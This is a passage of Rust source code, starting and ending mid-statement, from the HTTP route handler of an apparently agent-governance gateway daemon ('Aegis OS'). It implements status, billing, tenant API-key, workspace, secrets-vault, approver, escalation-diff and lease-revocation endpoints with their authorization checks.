                        ("HTTP/1.1 200 OK", paas::render_dashboard_html(&bound_ws_path))
                    } else if method == "GET" && route_path(full_target) == "/approve" {
                        content_type = "text/html; charset=utf-8";
                        ("HTTP/1.1 200 OK", approver::APPROVE_PAGE_HTML.to_string())
                    } else if method == "GET" && full_target.starts_with("/install.sh") {
                        content_type = "text/x-shellscript; charset=utf-8";
                        ("HTTP/1.1 200 OK", paas::INSTALL_SH.to_string())
                    } else if method == "GET" && full_target.starts_with("/health") {
                        (
                            "HTTP/1.1 200 OK",
                            json!({ "status": "ok", "service": "aegis-os-paas-daemon", "version": env!("CARGO_PKG_VERSION") }).to_string(),
                        )
                    } else if method == "GET"
                        && (full_target.starts_with("/.well-known/agent.json")
                            || full_target.starts_with("/.well-known/agent-card.json"))
                    {
                        let base_url = format!("http://{}", local_addr);
                        let all_peers = k.ipc.list_all_peers().await.unwrap_or_default();
                        let cards: Vec<_> = all_peers
                            .iter()
                            .filter(|p| p.online)
                            .map(|p| p.to_agent_card(&base_url))
                            .collect();
                        let skills: Vec<_> = cards
                            .iter()
                            .flat_map(|c| c.skills.clone())
                            .collect();
                        (
                            "HTTP/1.1 200 OK",
                            json!({
                                "name": "aegis-os-workstation-gateway",
                                "description": "Aegis OS Policy-Governed Multi-Agent A2A & MCP Gateway",
                                "url": format!("{}/a2a", base_url),
                                "version": env!("CARGO_PKG_VERSION"),
                                "protocolVersion": "0.2.0",
                                "capabilities": {
                                    "streaming": true,
                                    "pushNotifications": true,
                                    "stateTransitionHistory": true,
                                    "aegisPolicyKernel": true,
                                    "aegisCloudPaas": true
                                },
                                "defaultInputModes": ["text/plain", "application/json", "application/octet-stream"],
                                "defaultOutputModes": ["text/plain", "application/json", "application/octet-stream"],
                                "skills": skills,
                                "agents": cards
                            })
                            .to_string(),
                        )
                    } else if method == "GET"
                        && (full_target.starts_with("/api/status")
                            || full_target.starts_with("/v1/status"))
                    {
                        let requested_scope = if let Some((_, after)) = full_target.split_once("org_id=") {
                            let val = after.split('&').next().unwrap_or("*").trim();
                            if val.is_empty() { "*".to_string() } else { val.to_string() }
                        } else if org_id == "default-org" {
                            "*".to_string()
                        } else {
                            org_id.clone()
                        };
                        // Only the operator (or insecure local mode, or read-only Web Console status)
                        // may widen the view. A tenant key is always pinned to its own org, even when
                        // its org id is `default-org` and the request omits `org_id`.
                        let effective_org = if is_operator
                            || auth_mode == DaemonAuth::Disabled
                            || raw_auth.is_none()
                        {
                            requested_scope
                        } else {
                            org_id.clone()
                        };
                        let peers = if effective_org == "*" {
                            k.ipc.list_all_peers().await.unwrap_or_default()
                        } else {
                            k.ipc.list_peers(&effective_org).await.unwrap_or_default()
                        };
                        let global_peers = if effective_org == "*" {
                            k.ipc.list_all_peers().await.unwrap_or_default()
                        } else {
                            Vec::new()
                        };
                        // A2A tasks follow the same org scope as every other section: only the
                        // operator (or insecure local mode) may see the whole workstation.
                        let tasks = if effective_org == "*" {
                            k.ipc.list_tasks(None, None).await.unwrap_or_default()
                        } else {
                            k.ipc.list_tasks(Some(&effective_org), None).await.unwrap_or_default()
                        };
                        let escalations = k.policy.list_escalations(&effective_org).await.unwrap_or_default();
                        let leases = k.policy.list_leases(&effective_org, None).await.unwrap_or_default();
                        let workspaces = k.paas.list_workspaces(Some(&effective_org)).await;
                        let api_keys = if is_operator
                            || auth_mode == DaemonAuth::Disabled
                            || key_org.is_some()
                        {
                            k.paas.list_api_keys(Some(&effective_org)).await
                        } else {
                            Vec::new()
                        };
                        let tenants = k.paas.list_tenants(Some(&effective_org)).await;
                        let secrets = if effective_org == "*" {
                            let mut all_sec = k.egress.list_redacted_secrets("aegis-os").await;
                            all_sec.extend(k.egress.list_redacted_secrets("acme").await);
                            all_sec.extend(k.egress.list_redacted_secrets("default-org").await);
                            all_sec
                        } else {
                            k.egress.list_redacted_secrets(&effective_org).await
                        };
                        let telemetry = if effective_org == "*" {
                            Some(k.paas.get_telemetry_stats().await)
                        } else {
                            None
                        };
                        (
                            "HTTP/1.1 200 OK",
                            json!({
                                "org_id": effective_org,
                                "peers": peers,
                                "global_peers": global_peers,
                                "a2a_tasks": tasks,
                                "pending_escalations": escalations,
                                "active_leases": leases,
                                "workspaces": workspaces,
                                "api_keys": api_keys,
                                "tenants": tenants,
                                "secrets": secrets,
                                "telemetry": telemetry
                            })
                            .to_string(),
                        )
                    } else if method == "POST" && full_target.starts_with("/v1/telemetry/ping") {
                        let Ok(payload) =
                            serde_json::from_str::<paas::TelemetryPingPayload>(body_str.trim())
                        else {
                            let body = json!({ "error": "Invalid telemetry ping JSON payload" }).to_string();
                            let resp = format!(
                                "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                                body.len(),
                                body
                            );
                            let _ = stream.write_all(resp.as_bytes()).await;
                            return;
                        };
                        match k.paas.record_telemetry_ping(payload).await {
                            Ok(val) => ("HTTP/1.1 200 OK", val.to_string()),
                            Err(e) => (
                                "HTTP/1.1 400 Bad Request",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if method == "GET" && full_target.starts_with("/v1/telemetry/stats") {
                        let stats = k.paas.get_telemetry_stats().await;
                        ("HTTP/1.1 200 OK", stats.to_string())
                    } else if method == "POST" && full_target.starts_with("/v1/tenants/plan") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let t_org = payload.get("org_id").and_then(|v| v.as_str()).unwrap_or(&org_id);
                        let raw_tier = payload.get("plan_tier").and_then(|v| v.as_str()).unwrap_or("pro");
                        let tier = paas::PlanTier::from_str_lossy(raw_tier);

                        // Enforce admin secret guard when upgrading to a paid tier in production (`AOS_ADMIN_SECRET` or `AOS_REQUIRE_API_KEY=1`)
                        // The expected secret is server-side configuration, never request data.
                        let expected_admin = k.paas.admin_secret();
                        let provided_admin = headers
                            .get("x-aegis-admin-secret")
                            .map(|s| s.trim())
                            .unwrap_or("");
                        let require_admin = !expected_admin.trim().is_empty()
                            || (std::env::var("AOS_REQUIRE_API_KEY").as_deref() == Ok("1")
                                && tier != paas::PlanTier::Community);

                        if require_admin
                            && !is_operator
                            && !paas::PaasControlPlane::secrets_match(provided_admin, expected_admin.trim())
                        {
                            let checkout = k.paas.build_checkout_info(t_org, tier, None, None);
                            (
                                "HTTP/1.1 403 Forbidden",
                                json!({
                                    "error": "Direct plan upgrades require X-Aegis-Admin-Secret or a verified billing webhook (/v1/billing/webhook).",
                                    "code": "PAYWALL_ADMIN_SECRET_REQUIRED",
                                    "org_id": t_org,
                                    "requested_plan": tier.as_str(),
                                    "checkout_url": checkout["checkout_url"],
                                    "cli_command": "aegis-os cloud subscribe --plan pro  # pay in browser, then: aegis-os cloud subscribe --claim && aegis-os cloud up"
                                })
                                .to_string(),
                            )
                        } else {
                            match k.paas.set_tenant_plan(t_org, tier).await {
                                Ok(rec) => (
                                    "HTTP/1.1 200 OK",
                                    json!({
                                        "status": "plan_updated",
                                        "tenant": rec,
                                        "monthly_price_usd": tier.monthly_price_usd(),
                                        "max_exec_timeout_ms": tier.max_exec_timeout_ms(),
                                        "max_daily_syscalls": tier.max_daily_syscalls(),
                                        "max_daily_exec_ms": tier.max_daily_exec_ms()
                                    })
                                    .to_string(),
                                ),
                                Err(e) => (
                                    "HTTP/1.1 500 Internal Server Error",
                                    json!({ "error": e.to_string() }).to_string(),
                                ),
                            }
                        }
                    } else if full_target.starts_with("/v1/billing/status") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let mut s_org = payload
                            .get("org_id")
                            .and_then(|v| v.as_str())
                            .map(|s| s.to_string());
                        let mut s_email = payload
                            .get("email")
                            .or_else(|| payload.get("customer_email"))
                            .and_then(|v| v.as_str())
                            .map(|s| s.to_string());
                        if let Some((_, qs)) = full_target.split_once('?') {
                            for pair in qs.split('&') {
                                if let Some((qk, qv)) = pair.split_once('=') {
                                    let decoded = qv.replace("%40", "@").replace('+', " ");
                                    match qk {
                                        "org_id" if !decoded.is_empty() => s_org = Some(decoded),
                                        "email" | "customer_email" if !decoded.is_empty() => {
                                            s_email = Some(decoded)
                                        }
                                        _ => {}
                                    }
                                }
                            }
                        }
                        if s_org.is_none() && org_id != "default-org" {
                            s_org = Some(org_id.clone());
                        }
                        let status_val = k
                            .paas
                            .get_subscription_and_quota_status(s_org.as_deref(), s_email.as_deref())
                            .await;
                        ("HTTP/1.1 200 OK", status_val.to_string())
                    } else if full_target.starts_with("/v1/billing/checkout") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let mut c_org = payload
                            .get("org_id")
                            .and_then(|v| v.as_str())
                            .unwrap_or(&org_id)
                            .to_string();
                        let mut c_plan = payload
                            .get("plan_tier")
                            .or_else(|| payload.get("plan"))
                            .and_then(|v| v.as_str())
                            .unwrap_or("pro")
                            .to_string();
                        let mut c_email = payload
                            .get("email")
                            .or_else(|| payload.get("customer_email"))
                            .and_then(|v| v.as_str())
                            .map(|s| s.to_string());
                        if let Some((_, qs)) = full_target.split_once('?') {
                            for pair in qs.split('&') {
                                if let Some((qk, qv)) = pair.split_once('=') {
                                    match qk {
                                        "org_id" if !qv.is_empty() => c_org = qv.to_string(),
                                        "plan" | "plan_tier" if !qv.is_empty() => c_plan = qv.to_string(),
                                        "email" | "customer_email" if !qv.is_empty() => {
                                            c_email = Some(qv.to_string())
                                        }
                                        _ => {}
                                    }
                                }
                            }
                        }
                        let tier = paas::PlanTier::from_str_lossy(&c_plan);
                        match k.paas.create_checkout(&c_org, tier, c_email.as_deref()).await {
                            Ok(info) => ("HTTP/1.1 200 OK", info.to_string()),
                            Err(e) => (
                                "HTTP/1.1 500 Internal Server Error",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/billing/webhook") {
                        let webhook_secret = k.paas.webhook_secret();
                        if webhook_secret.trim().is_empty() {
                            (
                                "HTTP/1.1 503 Service Unavailable",
                                json!({
                                    "error": "Billing webhooks are disabled: AOS_BILLING_WEBHOOK_SECRET is not configured on this server."
                                })
                                .to_string(),
                            )
                        } else if !paas::PaasControlPlane::verify_webhook_signature(
                            &webhook_secret,
                            &headers,
                            &body_str,
                        ) {
                            (
                                "HTTP/1.1 401 Unauthorized",
                                json!({
                                    "error": "Invalid billing webhook HMAC-SHA256 signature"
                                })
                                .to_string(),
                            )
                        } else {
                            let payload: Value =
                                serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                            match k.paas.handle_billing_webhook(&k, &payload).await {
                                Ok(val) => ("HTTP/1.1 200 OK", val.to_string()),
                                Err(e) => (
                                    "HTTP/1.1 500 Internal Server Error",
                                    json!({ "error": e.to_string() }).to_string(),
                                ),
                            }
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/billing/claim") {
                        let payload: Value =
                            serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let claim_token = payload
                            .get("claim_token")
                            .and_then(|v| v.as_str())
                            .unwrap_or("");
                        match k.paas.claim_subscription_key(claim_token).await {
                            Ok(val) => ("HTTP/1.1 200 OK", val.to_string()),
                            Err(e) => (
                                "HTTP/1.1 404 Not Found",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/tenants/keys") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let k_org = payload.get("org_id").and_then(|v| v.as_str()).unwrap_or(&org_id);
                        let k_agent = payload.get("agent_id").and_then(|v| v.as_str()).unwrap_or("cloud-coder-1");
                        let k_role = payload.get("role").and_then(|v| v.as_str()).unwrap_or("Aegis Cloud Agent");
                        let k_ws = payload.get("workspace_id").and_then(|v| v.as_str()).map(|s| s.to_string());
                        let k_label = payload.get("label").and_then(|v| v.as_str()).unwrap_or("PaaS API Key");

                        // Prevent unauthenticated key minting on paid tenants (`Pro` / `Team` / `Enterprise`) when `AOS_REQUIRE_API_KEY=1` or admin secret is enforced
                        let target_tier = k.paas.get_tenant_plan(k_org).await;
                        let expected_admin = k.paas.admin_secret();
                        let has_valid_admin = headers
                            .get("x-aegis-admin-secret")
                            .map(|s| paas::PaasControlPlane::secrets_match(s.trim(), expected_admin.trim()))
                            .unwrap_or(false);
                        let has_same_org_auth = raw_auth.is_some() && !auth_failed && org_id == k_org;
                        let enforce_paid_guard = std::env::var("AOS_REQUIRE_API_KEY").as_deref() == Ok("1")
                            || !expected_admin.trim().is_empty();
                        // Anonymous callers may only bootstrap an org that has no keys yet; otherwise
                        // anyone could mint keys into someone else's tenant.
                        let org_has_keys = !k.paas.list_api_keys(Some(k_org)).await.is_empty();
                        let anonymous_takeover = auth_mode == DaemonAuth::Required
                            && !is_operator
                            && !has_same_org_auth
                            && org_has_keys;

                        if anonymous_takeover {
                            (
                                "HTTP/1.1 403 Forbidden",
                                json!({
                                    "error": "This org already has API keys: minting another requires an existing key for that org or the operator token. If this is a different project that happens to share the name, use a distinct org id.",
                                    "code": "KEY_MINT_ORG_EXISTS",
                                    "org_id": k_org
                                })
                                .to_string(),
                            )
                        } else if enforce_paid_guard
                            && target_tier != paas::PlanTier::Community
                            && !has_same_org_auth
                            && !has_valid_admin
                            && !is_operator
                        {
                            (
                                "HTTP/1.1 403 Forbidden",
                                json!({
                                    "error": "Minting additional API keys for a paid tenant requires an existing Bearer token for that org or X-Aegis-Admin-Secret.",
                                    "code": "PAYWALL_KEY_MINT_FORBIDDEN",
                                    "org_id": k_org
                                })
                                .to_string(),
                            )
                        } else {
                            match k.paas.issue_api_key(k_org, k_agent, k_role, k_ws, k_label).await {
                                Ok((raw_key, record)) => (
                                    "HTTP/1.1 200 OK",
                                    json!({
                                        "status": "issued",
                                        "api_key": raw_key,
                                        "record": record
                                    })
                                    .to_string(),
                                ),
                                Err(e) => (
                                    "HTTP/1.1 500 Internal Server Error",
                                    json!({ "error": e.to_string() }).to_string(),
                                ),
                            }
                        }
                    } else if method == "GET" && full_target.starts_with("/v1/tenants/keys") {
                        let scope = (auth_mode == DaemonAuth::Required && !is_operator).then_some(org_id.as_str());
                        let keys = k.paas.list_api_keys(scope).await;
                        ("HTTP/1.1 200 OK", json!({ "api_keys": keys }).to_string())
                    } else if method == "POST" && full_target == "/v1/workspaces" {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let w_org = payload.get("org_id").and_then(|v| v.as_str()).unwrap_or(&org_id);
                        let auth_tier = k.paas.get_tenant_plan(&org_id).await;
                        if auth_tier != paas::PlanTier::Community
                            && k.paas.get_tenant_plan(w_org).await == paas::PlanTier::Community
                        {
                            let _ = k.paas.set_tenant_plan(w_org, auth_tier).await;
                        }
                        let w_id = payload.get("workspace_id").and_then(|v| v.as_str()).unwrap_or("");
                        let w_src = payload
                            .get("source_url")
                            .or_else(|| payload.get("git_url"))
                            .and_then(|v| v.as_str())
                            .unwrap_or_else(|| ws_path.to_str().unwrap_or("."));
                        let w_branch = payload.get("branch").and_then(|v| v.as_str()).unwrap_or("main");
                        let w_agents: Vec<String> = payload
                            .get("agents")
                            .and_then(|v| serde_json::from_value(v.clone()).ok())
                            .unwrap_or_else(|| vec!["cloud-coder-1".to_string()]);
                        match k
                            .paas
                            .provision_workspace(&k, w_org, w_id, w_src, w_branch, w_agents)
                            .await
                        {
                            Ok(rec) => (
                                "HTTP/1.1 200 OK",
                                json!({
                                    "status": "provisioned",
                                    "workspace": rec,
                                    "mcp_endpoint": format!("http://{}/v1/mcp", local_addr),
                                    "a2a_endpoint": format!("http://{}/v1/a2a", local_addr),
                                    "dashboard_url": format!("http://{}/dashboard", local_addr)
                                })
                                .to_string(),
                            ),
                            Err(e) => (
                                "HTTP/1.1 500 Internal Server Error",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if method == "GET" && full_target == "/v1/workspaces" {
                        let scope = (auth_mode == DaemonAuth::Required && !is_operator)
                            .then_some(org_id.as_str());
                        let list = k.paas.list_workspaces(scope).await;
                        ("HTTP/1.1 200 OK", json!({ "workspaces": list }).to_string())
                    } else if method == "POST" && full_target.starts_with("/v1/workspaces/gc-idle") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let idle_override = payload.get("idle_timeout_ms").and_then(|v| v.as_i64());
                        match k.paas.hibernate_idle_workspaces(&k, idle_override).await {
                            Ok(hibernated) => (
                                "HTTP/1.1 200 OK",
                                json!({
                                    "status": "gc_completed",
                                    "hibernated_count": hibernated.len(),
                                    "hibernated_workspaces": hibernated
                                })
                                .to_string(),
                            ),
                            Err(e) => (
                                "HTTP/1.1 500 Internal Server Error",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/workspaces/hibernate") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let w_org = payload.get("org_id").and_then(|v| v.as_str()).unwrap_or(&org_id);
                        let w_id = payload.get("workspace_id").and_then(|v| v.as_str()).unwrap_or("ws-core");
                        match k.paas.hibernate_workspace(&k, w_org, w_id).await {
                            Ok(rec) => (
                                "HTTP/1.1 200 OK",
                                json!({
                                    "status": "hibernated",
                                    "scale_to_zero": true,
                                    "workspace": rec
                                })
                                .to_string(),
                            ),
                            Err(e) => (
                                "HTTP/1.1 404 Not Found",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/workspaces/delete") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let w_org = payload.get("org_id").and_then(|v| v.as_str()).unwrap_or(&org_id);
                        let w_id = payload.get("workspace_id").and_then(|v| v.as_str()).unwrap_or("ws-core");
                        match k.paas.delete_workspace(&k, w_org, w_id).await {
                            Ok(val) => ("HTTP/1.1 200 OK", val.to_string()),
                            Err(e) => (
                                "HTTP/1.1 404 Not Found",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/workspaces/wake") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let w_org = payload.get("org_id").and_then(|v| v.as_str()).unwrap_or(&org_id);
                        let w_id = payload.get("workspace_id").and_then(|v| v.as_str()).unwrap_or("ws-core");
                        match k.paas.wake_workspace_if_needed(&k, w_org, w_id).await {
                            Ok((rec, wake_ms)) => (
                                "HTTP/1.1 200 OK",
                                json!({
                                    "status": "active",
                                    "wake_latency_ms": wake_ms,
                                    "workspace": rec
                                })
                                .to_string(),
                            ),
                            Err(e) => (
                                "HTTP/1.1 404 Not Found",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/workspaces/sync-up") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let w_org = payload.get("org_id").and_then(|v| v.as_str()).unwrap_or(&org_id);
                        let w_id = payload
                            .get("workspace_id")
                            .and_then(|v| v.as_str())
                            .or(bound_ws_id.as_deref())
                            .unwrap_or("ws-core");
                        let files: Vec<paas::SourceFileEntry> = payload
                            .get("files")
                            .and_then(|v| serde_json::from_value(v.clone()).ok())
                            .unwrap_or_default();
                        match k.paas.sync_up_source_bundle(&k, w_org, w_id, files).await {
                            Ok(val) => ("HTTP/1.1 200 OK", val.to_string()),
                            Err(e) => (
                                "HTTP/1.1 500 Internal Server Error",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if full_target.starts_with("/v1/workspaces/diff") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let mut query_org = payload
                            .get("org_id")
                            .and_then(|v| v.as_str())
                            .unwrap_or(&org_id)
                            .to_string();
                        let mut query_agent = payload
                            .get("agent_id")
                            .and_then(|v| v.as_str())
                            .unwrap_or(&agent_id)
                            .to_string();
                        let mut query_ws = payload
                            .get("workspace_id")
                            .and_then(|v| v.as_str())
                            .map(|s| s.to_string())
                            .or_else(|| bound_ws_id.clone());
                        if let Some((_, qs)) = full_target.split_once('?') {
                            for pair in qs.split('&') {
                                if let Some((qk, qv)) = pair.split_once('=') {
                                    match qk {
                                        "org_id" if !qv.is_empty() => query_org = qv.to_string(),
                                        "agent_id" if !qv.is_empty() => query_agent = qv.to_string(),
                                        "workspace_id" if !qv.is_empty() => query_ws = Some(qv.to_string()),
                                        _ => {}
                                    }
                                }
                            }
                        }
                        match k
                            .paas
                            .inspect_agent_diff(&k, &query_org, &query_agent, query_ws.as_deref())
                            .await
                        {
                            Ok(val) => ("HTTP/1.1 200 OK", val.to_string()),
                            Err(e) => (
                                "HTTP/1.1 500 Internal Server Error",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/workspaces/pr") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let p_org = payload.get("org_id").and_then(|v| v.as_str()).unwrap_or(&org_id);
                        let p_agent = payload.get("agent_id").and_then(|v| v.as_str()).unwrap_or(&agent_id);
                        let p_ws = payload.get("workspace_id").and_then(|v| v.as_str());
                        let p_branch = payload.get("branch_name").and_then(|v| v.as_str()).unwrap_or("");
                        let p_title = payload.get("commit_title").and_then(|v| v.as_str()).unwrap_or("");
                        let overwrite_bin = payload
                            .get("overwrite_binaries")
                            .and_then(|v| v.as_bool())
                            .unwrap_or(false);
                        let id = AgentIdentity::new(p_org, p_agent, "Aegis Cloud Agent");
                        match k
                            .paas
                            .export_workspace_pr(&k, &id, p_ws, p_branch, p_title, overwrite_bin)
                            .await
                        {
                            Ok(val) => ("HTTP/1.1 200 OK", val.to_string()),
                            Err(e) => (
                                "HTTP/1.1 500 Internal Server Error",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/vault/secrets") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let s_org = payload.get("org_id").and_then(|v| v.as_str()).unwrap_or(&org_id).to_string();
                        let placeholder = payload
                            .get("placeholder")
                            .and_then(|v| v.as_str())
                            .unwrap_or("$AOS_SECRET_DEFAULT")
                            .to_string();
                        let value = payload
                            .get("value")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string();
                        let allowed_domains: Vec<String> = payload
                            .get("allowed_domains")
                            .and_then(|v| serde_json::from_value(v.clone()).ok())
                            .unwrap_or_default();
                        let allowed_methods: Vec<String> = payload
                            .get("allowed_methods")
                            .and_then(|v| serde_json::from_value(v.clone()).ok())
                            .unwrap_or_default();
                        let allowed_path_prefixes: Vec<String> = payload
                            .get("allowed_path_prefixes")
                            .and_then(|v| serde_json::from_value(v.clone()).ok())
                            .unwrap_or_default();
                        k.egress
                            .allow_domains(&s_org, allowed_domains.clone())
                            .await;
                        k.egress
                            .register_scoped_secret(
                                SecretVaultEntry {
                                    org_id: s_org.clone(),
                                    placeholder: placeholder.clone(),
                                    real_secret_value: value,
                                    allowed_domains: allowed_domains.clone(),
                                },
                                allowed_methods,
                                allowed_path_prefixes,
                            )
                            .await;
                        (
                            "HTTP/1.1 200 OK",
                            json!({
                                "status": "secret_registered",
                                "org_id": s_org,
                                "placeholder": placeholder,
                                "allowed_domains": allowed_domains
                            })
                            .to_string(),
                        )
                    } else if method == "GET" && full_target.starts_with("/v1/vault/secrets") {
                        let list = k.egress.list_redacted_secrets(&org_id).await;
                        ("HTTP/1.1 200 OK", json!({ "secrets": list }).to_string())
                    } else if method == "GET" && route_path(full_target) == "/approver/enroll" {
                        content_type = "text/html; charset=utf-8";
                        ("HTTP/1.1 200 OK", approver::ENROLL_PAGE_HTML.to_string())
                    } else if method == "POST" && route_path(full_target) == "/approver/enroll" {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let token = payload.get("token").and_then(|v| v.as_str()).unwrap_or("");
                        match k.paas.confirm_approver_email_enrollment(token).await {
                            Ok(v) => ("HTTP/1.1 200 OK", v.to_string()),
                            Err(e) => ("HTTP/1.1 400 Bad Request", json!({ "error": e.to_string() }).to_string()),
                        }
                    } else if route_path(full_target).starts_with("/v1/approver") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let mut target_org = key_org
                            .clone()
                            .or_else(|| requested_org(full_target, &body_str))
                            .unwrap_or_else(|| org_id.clone());
                        if key_org.is_none() && target_org == "default-org" {
                            if let Ok(env_org) = std::env::var("AOS_ORG") {
                                if !env_org.trim().is_empty() {
                                    target_org = env_org.trim().to_string();
                                }
                            } else if let Ok(escs) = k.policy.list_escalations("*").await {
                                if let Some(first) = escs.first() {
                                    target_org = first.org_id.clone();
                                }
                            }
                        }
                        match (method, route_path(full_target)) {
                            ("GET", "/v1/approver") => ("HTTP/1.1 200 OK", k.paas.approver_status(&target_org).await.to_string()),
                            ("POST", "/v1/approver/email") => {
                                let email = payload.get("email").and_then(|v| v.as_str()).unwrap_or("");
                                match k.paas.request_approver_email_enrollment(&target_org, email).await {
                                    Ok(v) => ("HTTP/1.1 200 OK", v.to_string()),
                                    Err(e) => ("HTTP/1.1 400 Bad Request", json!({ "error": e.to_string() }).to_string()),
                                }
                            }
                            ("DELETE", "/v1/approver") => match k.paas.remove_approver(&target_org).await {
                                Ok(removed) => ("HTTP/1.1 200 OK", json!({ "org_id": target_org, "removed": removed }).to_string()),
                                Err(e) => ("HTTP/1.1 500 Internal Server Error", json!({ "error": e.to_string() }).to_string()),
                            },
                            _ => ("HTTP/1.1 404 Not Found", json!({ "error": "Unknown approver route" }).to_string()),
                        }
                    } else if method == "DELETE" && route_path(full_target) == "/v1/orgs" {
                        let force = full_target.contains("force=true");
                        let orgs = requested_orgs(full_target, &body_str);
                        match orgs.first() {
                            None => ("HTTP/1.1 400 Bad Request", json!({ "error": "org_id is required" }).to_string()),
                            Some(target_org) => match k.paas.delete_org(&k, target_org, force).await {
                                Ok(v) => ("HTTP/1.1 200 OK", v.to_string()),
                                Err(e) => ("HTTP/1.1 400 Bad Request", json!({ "error": e.to_string() }).to_string()),
                            },
                        }
                    } else if method == "GET" && full_target.starts_with("/v1/approvals/diff") {
                        let mut esc_id = String::new();
                        if let Some((_, qs)) = full_target.split_once('?') {
                            for pair in qs.split('&') {
                                if let Some((qk, qv)) = pair.split_once('=') {
                                    if matches!(qk, "escalation_id" | "id") && !qv.is_empty() {
                                        esc_id = qv
                                            .chars()
                                            .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
                                            .collect();
                                    }
                                }
                            }
                        }
                        let scope_org = if is_operator || auth_mode == DaemonAuth::Disabled || raw_auth.is_none() {
                            "*"
                        } else {
                            org_id.as_str()
                        };
                        let found_esc = k
                            .policy
                            .list_escalations(scope_org)
                            .await
                            .unwrap_or_default()
                            .into_iter()
                            .find(|e| e.escalation_id == esc_id);
                        if let Some(esc) = found_esc {
                            let diff_file = k
                                .runtime_data_root
                                .join("escalation_diffs")
                                .join(format!("{}.json", esc.escalation_id));
                            let mut diffs: Vec<aos_core::FileDiffEntry> = tokio::fs::read(&diff_file)
                                .await
                                .ok()
                                .and_then(|b| serde_json::from_slice(&b).ok())
                                .unwrap_or_default();
                            if diffs.is_empty() {
                                if let Ok(live) = k
                                    .paas
                                    .inspect_agent_diff(&k, &esc.org_id, &esc.agent_id, None)
                                    .await
                                {
                                    if let Some(arr) = live.get("diffs") {
                                        diffs = serde_json::from_value(arr.clone()).unwrap_or_default();
                                    }
                                }
                            }
                            if diffs.is_empty() {
                                let cow_dir = k
                                    .runtime_data_root
                                    .join("orgs")
                                    .join(&esc.org_id)
                                    .join("agents")
                                    .join(&esc.agent_id)
                                    .join("cow_workspace");
                                if cow_dir.join(".initialized").exists() {
                                    let compare_root = if bound_ws_path == cow_dir.join("upper_workspace") {
                                        cow_dir.join("baseline_snapshot")
                                    } else {
                                        bound_ws_path.clone()
                                    };
                                    if let Ok(ws) = CoWWorkspace::init(&compare_root, &cow_dir).await {
                                        diffs = ws.diff(None).await.unwrap_or_default();
                                    }
                                }
                            }
                            let unified_diff: String = diffs
                                .iter()
                                .filter_map(|d| d.preview_diff.as_deref())
                                .collect::<Vec<_>>()
                                .join("\n");
                            (
                                "HTTP/1.1 200 OK",
                                json!({
                                    "escalation": esc,
                                    "rationale": esc.rationale,
                                    "evidence_hash": esc.evidence_hash,
                                    "changed_files_count": diffs.len(),
                                    "diffs": diffs,
                                    "unified_diff": unified_diff,
                                    "diff": {
                                        "changed_files_count": diffs.len(),
                                        "diffs": diffs,
                                        "unified_diff": unified_diff,
                                    }
                                })
                                .to_string(),
                            )
                        } else {
                            (
                                "HTTP/1.1 404 Not Found",
                                json!({ "error": format!("Escalation '{}' not found", esc_id) }).to_string(),
                            )
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/leases/revoke") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let lease_id = payload
                            .get("lease_id")
                            .and_then(|v| v.as_str())
                            .unwrap_or("");
                        let scope_org = if is_operator || auth_mode == DaemonAuth::Disabled || raw_auth.is_none() {
                            "*"
                        } else {
                            org_id.as_str()
                        };
                        let matching_lease = k
                            .policy
                            .list_leases(scope_org, None)
                            .await
                            .unwrap_or_default()
                            .into_iter()
                            .find(|l| l.lease_id == lease_id);
                        if let Some(lease) = matching_lease {
                            let removed = k.policy.revoke_lease(lease_id).await.unwrap_or(false);
                            let _ = k
                                .recorder
                                .record(AuditEvent {
                                    event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
